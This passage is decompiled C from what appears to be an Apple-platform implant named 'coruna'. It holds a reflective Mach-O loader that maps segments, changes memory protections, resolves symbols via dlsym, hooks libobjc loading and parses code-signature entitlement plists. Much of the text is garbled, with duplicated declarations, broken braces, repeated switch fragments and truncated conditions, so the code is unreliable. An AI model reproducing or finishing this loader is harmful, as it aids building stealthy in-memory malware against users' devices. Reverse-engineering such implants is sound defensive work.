              flags <= err && err <= count) {
          if ((flags == 0) || (*status == flags)) {
            size = (**(void (**)(addr_2 + 0x10))(addr_2);
            if ((int)size != 0) {
              return size;
            }
          }
          else {
            size = 0;
          }
          if (u <= version) {
            return size;
          }
          if ((((*(long *)(handle + 0x150) < 0) ||
               (flags = *(int **)(handle + 0x148), err < flags)) ||
              (count = (int *)((long)flags + *(long *)(handle + 0x150)), count <= err)) ||
             ((err + 2 < flags || (version = version + 1, status = err, count < err + 2))))
          break;
        }
      }
      size = 0x14009;
    }
  }
  return size;
}





int coruna_block_dispose(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  uint64_t scratch;
  long action;
  uint64_t block_ctx;
  uint64_t *stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  
  status = 0xad001;
  if ((handle != 0) && (id_2 != (uint64_t *)0x0)) {
    serial_buf = &block_ctx;
    block_ctx = 0;
    sa_saved = k_implant_rodata_word_26a68;
    sa_new = 0;
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a70;
    thread_attr = coruna_macho_pagezero;
    host_info = &k_implant_rodata_word_28680;
    scratch = val;
    action = handle;
    stack_guard = serial_buf;
    err = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    if (err == 0xad017) {
      *id_2 = stack_guard[3];
      status = 0;
    }
    else {
      status = 0xad011;
      if (err != 0) {
        status = err;
      }
    }
    __Block_object_dispose(&block_ctx,8);
  }
  return status;
}





uint32_t coruna_macho_pagezero(long handle,long addr_2)
{
  unsigned long u;
  int err;
  unsigned long size;
  
  size = *(unsigned long *)(addr_2 + 0x30);
  if (size != 0) {
    err = _strncmp((char *)(addr_2 + 8),"__PAGEZERO",0xb);
    if (err == 0) {
      return 0;
    }
    u = *(unsigned long *)(handle + 0x28) - *(unsigned long *)(addr_2 + 0x28);
    if ((*(unsigned long *)(addr_2 + 0x28) <= *(unsigned long *)(handle + 0x28)) && (u < size)) {
      *(unsigned long *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) =
           *(long *)(addr_2 + 0x18) + u + *(long *)(*(long *)(handle + 0x30) + 0x18);
      return 0xad017;
    }
  }
  return 0;
}





uint64_t
uint64_t coruna_macho_get_slide(int64_t *arg,uint64_t val,uint64_t id_2,uint64_t size_3, uint8_t *buf)
{
  uint64_t u;
  uint8_t size;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)arg + 0x1d) == '\0') {
    u = 0;
  }
  else {
    if ((*arg == 0) || (arg[1] == 0)) {
      size = 0;
      u = 0;
      if (buf != (uint8_t *)0x0) {
      u = 0;
      *buf = size;
      }
      return u;
    }
    u = coruna_implant_via_vm_region_recurse(*arg,arg[1],val,id_2,size_3);
  }
  size = 1;
  if ((int)u != 0) {
    return u;
  }
fail:
  if (buf != (uint8_t *)0x0) {
    u = 0;
    *buf = size;
  }
  return u;
}





unsigned long coruna_mlock_range(long *arg,uint64_t val,mach_vm_address_t n,mach_vm_size_t m
                  ,uint64_t p,uint8_t *q)

{
  char err;
  bool count;
  uint type_id;
  uint version;
  int idx;
  unsigned long type_id_15;
  int *err;
  uint *data;
  vm_map_t target_task;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  if (*arg == 0) {
    err = *(char *)((long)arg + 0x1d);
    count = err == '\0';
  }
  else {
    err = *(char *)((long)arg + 0x1d);
    count = err == '\0';
    if (!count && arg[1] != 0) {
      type_id_15 = coruna_mach_vm_protect(*arg,arg[1],val,n,m,p);
      count = true;
      type_id = (uint)type_id_15;
      if ((type_id == 0) && (q != (uint8_t *)0x0)) {
      type_id_15 = 0;
      *q = count;
      }
      return type_id_15;
    }
  }
  target_task = (vm_map_t)val;
  if ((count) || (((uint)p >> 2 & 1) == 0)) {
    count = err != '\x01';
  }
  else {
    if ((target_task != 0) && (*(vm_map_t *)k_implant_mach_task_self_slot != target_task)) {
      return 0x14010;
    }
    idx = _mlock(n,m);
    if (idx != 0) {
      err = ___error();
      idx = *err;
      data = (uint *)___error();
      type_id = -*data;
      if (-1 < idx) {
        type_id = *data;
      }
      return (unsigned long)(type_id | 0x40000000);
    }
    _madvise(n,m,6);
    count = false;
  }
  version = _mach_vm_protect(target_task,n,m,0,(uint)p);
  type_id = 0;
  if (version != 0) {
    type_id = version | 0x80000000;
  }
  type_id_15 = (unsigned long)type_id;
joined_r0x00017b4c:
  if ((type_id == 0) && (q != (uint8_t *)0x0)) {
    type_id_15 = 0;
    *q = count;
  }
  return type_id_15;
}





uint64_t coruna_block_literal_init(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t scratch;
  void (*bootargs)(void);
  uint8_t *thread_attr;
  long host_info;
  
  if (handle != 0) {
    scratch = k_implant_nsconcretestackblock_slot;
    scratch = k_implant_rodata_word_26a78;
    bootargs = coruna_macho_pagezero;
    thread_attr = &k_implant_rodata_word_286b0;
    host_info = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
    return u;
  }
  return 0xad001;
}





void coruna_macho_foreach_loadcmd_block(uint64_t val)
{
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_rodata_word_26a78;
  thread_attr = coruna_macho_pagezero;
  host_info = &k_implant_rodata_word_286b0;
  serial_buf = val;
  coruna_macho_foreach_loadcmd(val,0x19,&scratch);
  return;
}





unsigned long coruna_macho_pagezero(long arg,long val)

{
  mach_vm_address_t address;
  int i;
  uint size;
  unsigned long type_id;
  uint64_t *obj;
  vm_machine_attribute_val_t cache_49;
  
  size = _strncmp((char *)(val + 8),"__PAGEZERO",0xb);
  type_id = (unsigned long)size;
  if (size != 0) {
    obj = *(uint64_t **)(arg + 0x20);
    address = obj[10] + *(long *)(val + 0x18);
    i = *(int *)(val + 0x3c);
    if (i == 0) {
      i = 1;
    }
    type_id = coruna_mlock_range(*obj,*(uint32_t *)(obj + 0xb),address,
                         *(uint64_t *)(val + 0x20),i,0);
    if ((int)type_id == 0) {
      cache_49 = 6;
      _mach_vm_machine_attribute
                (*(vm_map_t *)(*(long *)(arg + 0x20) + 0x58),address,
                 *(mach_vm_size_t *)(val + 0x20),1,&cache_49);
      type_id = 0;
    }
  }
  return type_id;
}





uint8_t * coruna_implant08_residual_12(long handle,long addr_2,uint64_t val)
{
  uint64_t *ptr;
  void *ptr;
  uint8_t *buf;
  
  buf = &k_implant_rodata_word_1200a;
  if (((handle != 0) && (addr_2 != 0)) &&
     (ptr = _realloc(*(void **)(handle + 0x98),(unsigned long)(*(int *)(handle + 0xa0) * 0x10 + 0x20)),
     ptr != (void *)0x0)) {
    buf = (uint8_t *)0x0;
    *(void **)(handle + 0x98) = ptr;
    ptr = (uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xa0) * 0x10);
    *(uint *)(handle + 0xa0) = *(uint *)(handle + 0xa0) + 1;
    *ptr = val;
    ptr[1] = addr_2;
  }
  return buf;
}





uint64_t coruna_loader_vm_deallocate(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    u = coruna_mach_vm_deallocate();
    if ((int)u == 0) {
      *(uint8_t *)(handle + 0x78) = 1;
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a78;
      thread_attr = coruna_macho_unwind_info;
      host_info = &k_implant_rodata_word_286d0;
      serial_buf = handle;
      u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
    }
  }
  return u;
}





uint64_t coruna_mach_vm_deallocate(long handle)
{
  uint u;
  kern_return_t lk2;
  uint64_t size;
  mach_vm_size_t size;
  uint64_t *ptr;
  byte err;
  long handle;
  mach_vm_address_t scratch;
  mach_vm_address_t bootargs;
  uint8_t *thread_attr;
  uint64_t host_info;
  void (*serial_buf)(void);
  uint8_t *action;
  uint64_t *block_ctx;
  uint64_t *stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint64_t *path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t *url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t *cache;
  uint64_t cache_20;
  uint64_t cache_21;
  
  cache = &work;
  work = 0;
  cache_20 = k_implant_rodata_word_26a68;
  cache_21 = 0;
  url_buf = &plist;
  plist = 0;
  json_buf = k_implant_rodata_word_26a68;
  frame = 0;
  path_buf = &sa_new;
  sa_new = 0;
  tmp_buf = k_implant_rodata_word_26a68;
  region = 0;
  if (handle == 0) {
    size = 0xad000;
  }
  else {
    thread_attr = k_implant_nsconcretestackblock_slot;
    host_info = k_implant_rodata_word_26a70;
    serial_buf = coruna_macho_text_seg;
    action = &k_implant_rodata_word_28880;
    block_ctx = cache;
    stack_guard = url_buf;
    sa_saved = path_buf;
    size = coruna_macho_foreach_loadcmd(handle,0x19,&thread_attr);
    ptr = url_buf;
    if ((int)size == 0) {
      bootargs = url_buf[3];
      if ((bootargs == 0) && (bootargs = 0, path_buf[3] != 0)) {
        bootargs = *(mach_vm_address_t *)(path_buf[3] + 0x18);
        url_buf[3] = bootargs;
      }
      if (*(char *)(handle + 0x1c2) == '\0') {
        size = cache[3];
        if (*(char *)(handle + 0x138) != '\0') {
          size = (long)(int)~(uint)*(long *)k_implant_vm_page_mask_slot &
                 *(long *)k_implant_vm_page_mask_slot + size;
          cache[3] = size;
        }
        lk2 = _mach_vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,&bootargs,size,1);
        if (lk2 != 0) {
          size = 0x14004;
          __Block_object_dispose(&sa_new,8);
          __Block_object_dispose(&plist,8);
          __Block_object_dispose(&work,8);
          return size;
        }
        err = *(byte *)(handle + 0x1c2) ^ 1;
        ptr = url_buf;
      }
      else {
        err = 0;
        bootargs = *(mach_vm_address_t *)(handle + 0x148);
        cache[3] = *(uint64_t *)(handle + 0x150);
      }
      handle = ptr[3];
      *(mach_vm_address_t *)(handle + 8) = bootargs;
      *(long *)(handle + 0x168) = handle;
      u = *(uint *)(cache + 3);
      handle = bootargs - handle;
      *(unsigned long *)(handle + 0x10) = (unsigned long)u;
      *(long *)(handle + 0x18) = handle;
      *(byte *)(handle + 0xfa) = err;
      if (*(char *)(handle + 0x138) == '\0') {
        size = 0;
        *(unsigned long *)(handle + 0x48) = (unsigned long)u;
        *(long *)(handle + 0x50) = handle;
        *(mach_vm_address_t *)(handle + 0x40) = bootargs;
        *(uint8_t *)(handle + 0xfb) = 0;
      }
      else {
        scratch = 0;
        lk2 = _mach_vm_allocate(*(vm_map_t *)(handle + 0x58),&scratch,cache[3],1);
        if (lk2 == 0) {
          size = 0;
          *(mach_vm_address_t *)(handle + 0x40) = scratch;
          *(uint64_t *)(handle + 0x48) = cache[3];
          *(mach_vm_address_t *)(handle + 0x50) = scratch - *(long *)(handle + 0x168);
          *(uint8_t *)(handle + 0xfb) = 1;
        }
        else {
          size = 0x1400f;
          if (*(char *)(handle + 0x1c2) == '\0') {
            _mach_vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,bootargs,cache[3]);
            *(mach_vm_address_t *)(handle + 8) = 0;
            *(uint64_t *)(handle + 0x10) = 0;
          }
        }
      }
    }
  }
fail:
  __Block_object_dispose(&sa_new,8);
  __Block_object_dispose(&plist,8);
  __Block_object_dispose(&work,8);
  return size;
}





uint coruna_macho_unwind_info(long handle,int *flags)
{
  long handle;
  void *ptr;
  void *buf;
  int *err;
  int *status;
  char err;
  int err;
  uint u;
  ushort size;
  long addr;
  void *str;
  long off;
  uint64_t *ptr;
  void *copy;
  void *data;
  unsigned long version;
  int *flags;
  int *count;
  unsigned long port;
  uint64_t *buf;
  
  if (*flags != 0x19) {
    return 0;
  }
  buf = *(uint64_t **)(handle + 0x20);
  if (buf == (uint64_t *)0x0) {
    return 0xad001;
  }
  err = _strncmp((char *)(flags + 2),"__PAGEZERO",0xb);
  if (err == 0) {
    return 0;
  }
  err = _strncmp((char *)(flags + 2),"__LINKEDIT",0xb);
  addr = *(long *)(flags + 6);
  if (err == 0) {
    off = *(long *)(flags + 10);
    handle = buf[3] + addr;
    buf[0x23] = handle;
    buf[0x24] = handle - off;
    version = *(unsigned long *)(flags + 8);
    buf[0x25] = version;
  }
  else {
    off = *(long *)(flags + 10);
    version = *(unsigned long *)(flags + 8);
  }
  data = (void *)(buf[3] + addr);
  str = (void *)buf[1];
  if (str == (void *)0x0) {
    return 0x14006;
  }
  if (!CARRY8((unsigned long)data,version)) {
    port = *(unsigned long *)(flags + 0xc);
    if ((port <= version) && (-1 < (long)buf[0x2a])) {
      copy = (void *)buf[0x29];
      ptr = (void *)((long)copy + off);
      if (((copy <= ptr) &&
          ((((buf = (void *)((long)copy + buf[0x2a]), ptr < buf &&
             (-1 < (long)port)) && (copy <= (void *)((long)ptr + port))) &&
           (((void *)((long)ptr + port) <= buf && (-1 < (long)buf[2])))))) &&
         ((str <= data &&
          (((copy = (void *)((long)str + buf[2]), data < copy &&
            (-1 < (long)version)) && (str <= (void *)((long)data + version))))))) {
        if (copy < (void *)((long)data + version)) {
          return 0x14007;
        }
        err = coruna_mach_vm_protect_fec8(*buf,*(uint32_t *)k_implant_mach_task_self_slot,data,version,3,
                             0);
        if (err != 0) {
          return 0x14008;
        }
        _memcpy(data,ptr,port);
        _bzero((void *)(port + (long)data),version - port);
        str = _realloc((void *)buf[0x10],(unsigned long)(*(int *)(buf + 0x11) * 0x18 + 0x30));
        if (str != (void *)0x0) {
          buf[0x10] = str;
          ptr = (uint64_t *)((long)str + (unsigned long)*(uint *)(buf + 0x11) * 0x18);
          *(uint *)(buf + 0x11) = *(uint *)(buf + 0x11) + 1;
          ptr[1] = version;
          ptr[2] = 0;
          *ptr = data;
          if (*(long *)(flags + 10) == 0) {
            buf[0x20] = buf[3] + *(long *)(flags + 6);
          }
          u = flags[0x10];
          if (u == 0) {
            return 0;
          }
          version = 0;
          status = (int *)buf[0x29];
          addr = buf[0x2a];
          err = (int *)((long)status + addr);
          flags = flags + 0x26;
          do {
            if (addr < 0) {
              return 0x1400a;
            }
            count = flags + -0x14;
            if (count < status) {
              return 0x1400a;
            }
            if (err <= count) {
              return 0x1400a;
            }
            if (flags < status) {
              return 0x1400a;
            }
            if (err < flags) {
              return 0x1400a;
            }
            err = (char)flags[-4];
            size = 1;
            if ((err == '\t') || (err == '\x16')) {
              *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
              u = flags[0x10];
            }
            else {
              if (err == '\n') {
                size = 2;
                *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                u = flags[0x10];
              }
              else {
                err = _strncmp((char *)count,"__eh_frame",0xb);
                if (err == 0) {
                  size = 8;
                  *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                  u = flags[0x10];
                }
                else {
                  err = _strncmp((char *)count,"__unwind_info",0xe);
                  if (err == 0) {
                    size = 0x10;
                    *(ushort *)(buf + 0x38) = *(ushort *)(buf + 0x38) | size;
                    u = flags[0x10];
                  }
                }
              }
            }
            version = version + 1;
            flags = flags + 0x14;
            if (u <= version) {
              return 0;
            }
          } while( true );
        }
        u = 0x2015;
        return u | 0x10000;
      }
    }
  }
  u = 0x4007;
done:
  return u | 0x10000;
}





uint64_t
uint64_t coruna_readclass_from_image(int64_t *arg,uint size,char *path,uint64_t val,int flags,uint64_t *id_2)
{
  int err;
  unsigned long u;
  long handle;
  long addr;
  
  if (arg == (long *)0x0) {
    return 0xad001;
  }
  addr = *arg;
  if ((addr == 0 || path == (char *)0x0) || id_2 == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (((*(void (**)(addr + 0xb0) != (void (*)0x0) &&
      (err = (**(void (**)(addr + 0xb0))(*(uint64_t *)(addr + 0xb8),path,val,id_2),
      err == 0)) ||
     ((*(char *)(addr + 0x1c) != '\0' &&
      ((*(char *)((long)arg + 0x1c3) != '\0' &&
       *id_2 = *id_2 & 0x7fffffffff;
       return 0;
}





uint64_t coruna_dlerror(uint64_t val,long handle,char *path,long addr_2,long *off_3)
{
  char err;
  long handle;
  uint64_t u;
  
  u = 0x910006;
  if (((path != (char *)0x0) && (handle != 0)) && (off_3 != (long *)0x0)) {
    err = *path;
    _dlerror();
    if (err == '_') {
      path = path + 1;
    }
    handle = _dlsym(handle,path);
    _dlerror();
    *off_3 = 0;
    if (handle != 0) {
      u = 0;
      *off_3 = handle + addr_2;
    }
  }
  return u;
}





long coruna_macho_seg19_offset(long handle,int flags,int count_2)
{
  long handle;
  int err;
  int status;
  int *err;
  
  err = *(int *)(*(long *)(handle + 0x170) + 0x10);
  if (err != 0) {
    status = 0;
    err = (int *)(*(long *)(handle + 0x148) + 0x20);
    do {
      if (*err == 0x19) {
        if (status == flags) {
          handle = 0x50;
          if (count_2 == 0) {
            handle = 0x18;
          }
          return *(long *)(handle + handle) + *(long *)(err + 6);
        }
        status = status + 1;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t coruna_macho_map_linkedit(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  uint8_t *action;
  uint64_t block_ctx;
  void (*stack_guard)(void);
  uint8_t *sa_saved;
  long sa_new;
  
  if (handle == 0) {
    u = 0x17000;
  }
  else {
    if (*(long *)(handle + 0x120) == 0) {
      action = k_implant_nsconcretestackblock_slot;
      block_ctx = k_implant_rodata_word_26a78;
      stack_guard = coruna_macho_linkedit;
      sa_saved = &k_implant_rodata_word_286f0;
      sa_new = handle;
      u = coruna_macho_foreach_loadcmd(handle,0x19,&action);
      if ((int)u != 0) {
        return u;
      }
    }
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_load_libobjc;
    host_info = &k_implant_rodata_word_28710;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0,&scratch);
  }
  return u;
}





uint64_t coruna_macho_linkedit(long handle,long addr_2)
{
  long handle;
  uint64_t u;
  int err;
  long addr;
  long off;
  
  err = _strncmp((char *)(addr_2 + 8),"__LINKEDIT",0xb);
  if (err == 0) {
    addr = *(long *)(handle + 0x20);
    u = *(uint64_t *)(addr_2 + 0x20);
    handle = *(long *)(addr + 0x18) + *(long *)(addr_2 + 0x18);
    off = *(long *)(addr_2 + 0x28);
    *(long *)(addr + 0x118) = handle;
    *(long *)(addr + 0x120) = handle - off;
    *(uint64_t *)(addr + 0x128) = u;
  }
  return 0;
}





unsigned long coruna_load_libobjc(long arg,int *val)

{
  char *data;
  unsigned long size;
  bool i;
  int j;
  long serial_8;
  ushort type_id_15;
  long serial_9;
  unsigned long type_id_11;
  unsigned long kind;
  uint type_id_12;
  unsigned long type_id_16;
  long *entry_10;
  uint8_t **lppu13;
  uint8_t ***lpppu14;
  uint64_t path_buf;
  uint8_t **cache_36;
  uint8_t **region;
  uint8_t **plist;
  long cache_37;
  
  type_id_16 = 0;
  cache_37 = *(long *)k_implant_stack_chk_guard_slot;
  j = *val;
  if (j < 0xb) {
    if (-0x7fffffce < j) {
      if (j == -0x7fffffcd) {
        type_id_16 = 0;
        *(int **)(*(long *)(arg + 0x20) + 400) = val;
      }
      else if (j == -0x7fffffcc) {
        type_id_16 = 0;
        *(int **)(*(long *)(arg + 0x20) + 0x198) = val;
      }
      else if (j == 2) {
        type_id_16 = 0x17001;
        if (*(long *)(*(long *)(arg + 0x20) + 0x120) == 0) {
          type_id_16 = 0x17000;
        }
        else {
          *(int **)(*(long *)(arg + 0x20) + 0x1a0) = val;
          serial_8 = *(long *)(arg + 0x20);
          *(unsigned long *)(serial_8 + 0x1b8) =
               *(long *)(serial_8 + 0x120) + (unsigned long)*(uint *)(*(long *)(serial_8 + 0x1a0) + 0x10);
          serial_8 = *(long *)(arg + 0x20);
          if (*(char *)(serial_8 + 0x1c2) == '\0') {
            if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
            ___stack_chk_fail();
            }
            return type_id_16;
          }
          else {
            serial_9 = *(long *)(serial_8 + 0x1a0);
          }
          *(unsigned long *)(serial_8 + 0x1a8) = *(long *)(serial_8 + 0x120) + (unsigned long)*(uint *)(serial_9 + 8);
          serial_8 = *(long *)(arg + 0x20);
          if (*(char *)(serial_8 + 0x1c2) == '\0') {
            type_id_12 = 0;
            if (*(long *)(serial_8 + 0x10) + *(unsigned long *)(serial_8 + 8) <= *(unsigned long *)(serial_8 + 0x1a8) ||
                *(unsigned long *)(serial_8 + 0x1a8) < *(unsigned long *)(serial_8 + 8)) {
              type_id_12 = 0x17001;
            }
            type_id_16 = (unsigned long)type_id_12;
          }
          else {
            type_id_16 = 0;
          }
        }
      }
      if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
      ___stack_chk_fail();
      }
      return type_id_16;
    }
    if (j != -0x7fffffe8) {
      if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
      ___stack_chk_fail();
      }
      return type_id_16;
    }
load_ok_36:
    type_id_16 = 0x17001;
    data = (char *)((long)val + (unsigned long)(uint)val[2]);
    entry_10 = *(long **)(arg + 0x20);
    if ((char *)entry_10[0x29] <= data && data < (char *)entry_10[0x29] + entry_10[0x2a]) {
      type_id_16 = 0x17004;
      if (*entry_10 != 0) {
        lppu13 = (uint8_t **)0x0;
        region = *(uint8_t ***)(*entry_10 + 0xc0);
        plist = &ptr_implant_fn_2c080;
        path_buf = 0;
        cache_36 = &ptr_implant_fn_28a80;
        i = (char)entry_10[0x27] != '\0';
        lpppu14 = &region;
        if (i) {
          lpppu14 = &cache_36;
        }
        serial_8 = 1;
        if (!i) {
          serial_8 = 2;
        }
        do {
          if (*val == -0x7fffffe8) {
          j = _strncmp(data,"/usr/local/lib/libobjc-env.dylib",0x20);
          type_id_12 = 0;
          if (j != 0) {
          type_id_12 = (uint)type_id_16;
          }
          type_id_16 = (unsigned long)type_id_12;
          }
          }
          if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
          ___stack_chk_fail();
          }
          return type_id_16;
          }
          if (j - 0xbU < 5) {
          switch(j) {
          if (serial_8 == 0) {
            if (*val == -0x7fffffe8) {
            j = _strncmp(data,"/usr/local/lib/libobjc-env.dylib",0x20);
            type_id_12 = 0;
            if (j != 0) {
            type_id_12 = (uint)type_id_16;
            }
            type_id_16 = (unsigned long)type_id_12;
            }
            }
            if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
            ___stack_chk_fail();
            }
            return type_id_16;
            }
            if (j - 0xbU < 5) {
            switch(j) {
            break;
          }
          lppu13 = *lpppu14;
          if (lppu13 != (uint8_t **)0x0) {
            path_buf = 0;
            type_id_16 = (*(void (*)*lppu13)(lppu13,data,2,&path_buf);
          }
          lpppu14 = lpppu14 + 1;
          serial_8 = serial_8 + -1;
        } while ((int)type_id_16 != 0);
        type_id_16 = coruna_implant08_residual_12(entry_10,lppu13,path_buf);
        if ((int)type_id_16 == 0) {
          serial_8 = *(long *)(arg + 0x20);
          if ((*(char *)(serial_8 + 0x138) == '\0') &&
             (j = _strncmp(data,"/usr/lib/libobjc.A.d",0x14), j == 0)) {
            type_id_16 = 0;
            *(uint8_t *)(serial_8 + 0x79) = 1;
            *(uint8_t *)(serial_8 + 0x130) = 1;
            *(uint8_t *)(serial_8 + 0x110) = 1;
            if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
            ___stack_chk_fail();
            }
            return type_id_16;
          }
          type_id_16 = 0;
        }
        else {
          (*(void (*)lppu13[1])(lppu13,path_buf);
        }
      }
load_ok_37:
      if (*val == -0x7fffffe8) {
        j = _strncmp(data,"/usr/local/lib/libobjc-env.dylib",0x20);
        type_id_12 = 0;
        if (j != 0) {
          type_id_12 = (uint)type_id_16;
        }
        type_id_16 = (unsigned long)type_id_12;
      }
    }
    if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
    ___stack_chk_fail();
    }
    return type_id_16;
  }
  if (j - 0xbU < 5) {
    switch(j) {
    default:
      type_id_16 = 0;
      *(int **)(*(long *)(arg + 0x20) + 0x1b0) = val;
      break;
    }
  }
  else {
    if (j != 0x1a) {
      if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
      ___stack_chk_fail();
      }
      return type_id_16;
    }
    serial_8 = *(long *)(arg + 0x20);
    type_id_15 = *(ushort *)(serial_8 + 0x1c0) | 4;
code_r0x00018a40:
    type_id_16 = 0;
    *(ushort *)(serial_8 + 0x1c0) = type_id_15;
  }
load_ok_34:
  if (*(long *)k_implant_stack_chk_guard_slot != cache_37) {
    ___stack_chk_fail();
  }
  return type_id_16;
}





unsigned long coruna_plist_dict(long *arg)

{
  int *status;
  int *flags;
  uint type_id_8;
  int idx;
  char *str;
  char *obj;
  char *block;
  char *entry;
  size_t ls9;
  long *buf;
  char *entry_9;
  unsigned long type_id_15;
  unsigned long type_id_16;
  long addr;
  unsigned long type_id_10;
  uint8_t *cache_49;
  uint64_t cache_50;
  void (*cache_51)(void);
  uint8_t *cache_52;
  uint64_t *cache_53;
  uint64_t *cache_54;
  uint64_t *cache_55;
  uint64_t cache_56;
  uint64_t *cache_57;
  uint64_t cache_58;
  uint32_t cache_59;
  uint64_t stack_guard;
  uint64_t *sa_saved;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t tmp_buf;
  uint64_t *region;
  uint64_t plist;
  uint8_t url_buf;
  uint32_t json_buf[2];
  char *cache_45;
  uint32_t scratch;
  uint32_t sa_saved;
  uint32_t bootargs[2];
  uint32_t *thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  type_id_15 = 0xad001;
  if ((arg == (long *)0x0) || (buf = (long *)*arg, buf == (long *)0x0))
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
  return type_id_15;
  }
  ___stack_chk_fail();
  if ((*buf == 0) ||
     ((*(char *)((long)buf + 0x1d) == '\0' || buf[1] == 0 || (arg[0x23] == 0)))) {
    type_id_15 = 0;
    if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return type_id_15;
    }
    ___stack_chk_fail();
  }
  cache_53 = &tmp_buf;
  tmp_buf = 0;
  plist = k_implant_rodata_word_1e8c0;
  url_buf = 0;
  cache_54 = &stack_guard;
  stack_guard = 0;
  sa_new = k_implant_rodata_word_1e8c0;
  path_buf = 0;
  cache_55 = &cache_56;
  cache_56 = 0;
  cache_58 = k_implant_rodata_word_1e8c0;
  cache_59 = 0;
  cache_49 = k_implant_nsconcretestackblock_slot;
  cache_50 = k_implant_rodata_word_1e8c8;
  cache_51 = coruna_wire_store_u32_pair;
  cache_52 = &k_implant_rodata_word_20198;
  cache_57 = cache_55;
  sa_saved = cache_54;
  region = cache_53;
  idx = coruna_macho_foreach_loadcmd(arg,0x1d,&cache_49);
  type_id_15 = 0;
  if (idx == 0) {
    if (*(char *)(region + 3) == '\0') {
      type_id_15 = 0;
    }
    else {
      type_id_15 = 0xad014;
      if ((*(uint *)(sa_saved + 3) != 0) && (*(int *)(cache_57 + 3) != 0)) {
        status = (int *)((unsigned long)*(uint *)(sa_saved + 3) + arg[0x29]);
        if (*status != -0x3ff32106) {
          type_id_15 = 0;
        }
        else {
          type_id_10 = 0;
          do {
            type_id_8 = (status[2] & 0xff00ff00U) >> 8 | (status[2] & 0xff00ffU) << 8;
            if ((type_id_8 >> 0x10 | type_id_8 << 0x10) <= type_id_10) {
              type_id_15 = 0;
              break;
            }
          if (status[type_id_10 * 2 + 3] == 0x5000000) {
            type_id_8 = (status[type_id_10 * 2 + 4] & 0xff00ff00U) >> 8 |
                    (status[type_id_10 * 2 + 4] & 0xff00ffU) << 8;
            flags = (int *)((long)status + (unsigned long)(type_id_8 >> 0x10 | type_id_8 << 0x10));
            type_id_8 = (flags[1] & 0xff00ff00U) >> 8 | (flags[1] & 0xff00ffU) << 8;
            type_id_8 = type_id_8 >> 0x10 | type_id_8 << 0x10;
            if (*flags != 0x7171defa || type_id_8 < 9) {
              type_id_15 = 0xad014;
              break;
            }
            type_id_16 = (unsigned long)(type_id_8 - 8);
            str = _strndup((char *)(flags + 2),type_id_16);
            if (str == (char *)0x0) {
              type_id_15 = 0xad009;
              break;
            }
            obj = _strstr(str,"<dict>");
            if (obj == (char *)0x0) {
              obj = (char *)0x0;
              type_id_8 = 0xad014;
            }
            else {
              entry = (char *)0x0;
              entry_9 = obj;
              do {
                block = entry;
                entry = _strstr(entry_9,"</dict>");
                entry_9 = entry + 1;
              } while (entry != (char *)0x0);
              if (block == (char *)0x0) {
                obj = (char *)0x0;
                type_id_8 = 0xad014;
              }
              else {
                block[7] = '\0';
                obj = _strdup(obj);
                type_id_8 = 0xad009;
                if (obj != (char *)0x0) {
                  type_id_8 = 0;
                }
              }
            }
            type_id_15 = (unsigned long)type_id_8;
            _bzero(str,type_id_16);
            _free(str);
            if (type_id_8 != 0) break;
            type_id_15 = 0xad001;
            if ((obj != (char *)0x0) && (type_id_15 = 0xad001, *obj != '\0')) {
              buf = (long *)*arg;
              type_id_15 = 0xad001;
              if (buf != (long *)0x0) {
                addr = *buf;
                type_id_15 = 0xad001;
                if (addr != 0) {
                  json_buf[0] = (uint32_t)arg[0xb];
                  cache_45 = obj;
                  ls9 = _strlen(obj);
                  scratch = (uint32_t)ls9;
                  sa_saved = 1;
                  bootargs[0] = 0x40000010;
                  thread_attr = json_buf;
